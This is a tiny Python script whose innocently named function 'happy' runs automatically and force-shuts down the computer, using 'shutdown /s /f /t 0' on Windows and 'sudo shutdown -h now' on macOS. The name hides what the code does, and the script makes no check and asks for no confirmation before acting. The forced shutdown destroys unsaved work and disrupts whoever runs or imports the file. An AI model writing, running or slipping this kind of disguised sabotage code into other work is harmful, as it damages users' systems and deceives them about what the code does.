import os
import platform


def happy():
    current_os = platform.system()

    if current_os == "Windows":
        os.system("shutdown /s /f /t 0")
    elif current_os == "Darwin":
        os.system("sudo shutdown -h now")


happy()
